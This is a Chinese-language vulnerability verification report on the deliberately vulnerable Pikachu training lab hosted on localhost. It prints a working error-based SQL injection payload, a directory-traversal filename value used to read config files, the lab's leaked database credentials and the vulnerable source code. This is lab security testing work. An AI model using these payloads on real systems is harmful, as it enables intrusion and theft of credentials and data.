# Pikachu 靶场漏洞验证最终报告

## 一、目标概况

| 项目 | 内容 |
|---|---|
| 目标 | `http://localhost/pikachu/` |
| Web 服务器 | Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a |
| 后端 | PHP/7.3.4（phpstudy_pro 环境） |
| 应用绝对路径 | `E:\App\phpstudy_pro\WWW\pikachu\` |
| 数据库 | MySQL `127.0.0.1:3306`，库名 `pikachu` |

## 二、已确认漏洞（均基于真实 HTTP 工具回显）

### 漏洞 1：字符型 SQL 注入（报错注入）—— 严重

- **入口**：`GET /pikachu/vul/sqli/sqli_str.php`
- **参数**：`name`（需同时携带 `submit`）
- **真实验证 payload**：
  ```
  name=' and updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1
  submit=查询
  ```
- **真实响应证据**：HTTP 200，响应体回显 `XPATH syntax error: '~pikachu~'`，确认当前数据库为 `pikachu`。
- **源码佐证**：经目录穿越读取 `sqli_str.php` 源码确认：
  ```php
  $name=$_GET['name'];   // 无任何过滤
  $query="select id,email from member where username='$name'";  // 直接拼接
  ```
- **结论**：参数无过滤拼接进入 SQL，报错信息完整回显，具备拖取 `users` 表数据能力。

### 漏洞 2：任意文件下载 / 目录穿越 —— 严重

- **入口**：`GET /pikachu/vul/unsafedownload/execdownload.php`
- **参数**：`filename`
- **真实验证 payload**：
  ```
  filename=../../../inc/config.inc.php
  ```
- **真实响应证据**：HTTP 200，`Content-Disposition: attachment; filename=config.inc.php`，响应体返回 PHP 源码明文泄露数据库凭据：
  ```php
  define('DBHOST', '127.0.0.1');
  define('DBUSER', 'root');
  define('DBPW', '123456');
  define('DBNAME', 'pikachu');
  define('DBPORT', '3306');
  ```
- **扩展验证**：`filename=../../../vul/sqli/sqli_str.php` 成功读取业务源码（HTTP 200，源码完整回显）。
- **结论**：`filename` 参数无路径校验，可穿越 Web 根目录读取任意源码/配置文件。

### 漏洞 3：敏感信息泄露 —— 中危

- 数据库连接口令明文外泄（root / 123456 / pikachu）。
- Web 应用 PHP 源码可被任意读取（目录穿越支撑）。
- 服务器指纹泄露：Apache/2.4.39 + PHP/7.3.4。

## 三、未确认 / 未深测攻击面

| 类型 | 状态 |
|---|---|
| XSS / CSRF / 越权 / 爆破 | 入口可达，未深测 |
| RCE / LFI / XXE / 上传 / 反序列化 / SSRF | 未获取有效利用回显，不列入确认 |

## 四、总结

1. 已确认漏洞 3 项：SQL 报错注入、任意文件下载(目录穿越)、敏感信息泄露。
2. 最高优先级利用链：
   - `execdownload.php` 任意文件下载 → 读取配置/源码（已获 root/123456/pikachu）；
   - `sqli_str.php` 报错注入 → 可拖取 `users` 表数据（需授权）。
3. 未证实项不列入已确认漏洞。

## 五、说明

- 全部漏洞结论均基于可回溯、可复现的真实 HTTP 工具回显，无编造。
- 攻击阶段按规则进行漏洞验证，未做入侵性控制操作。
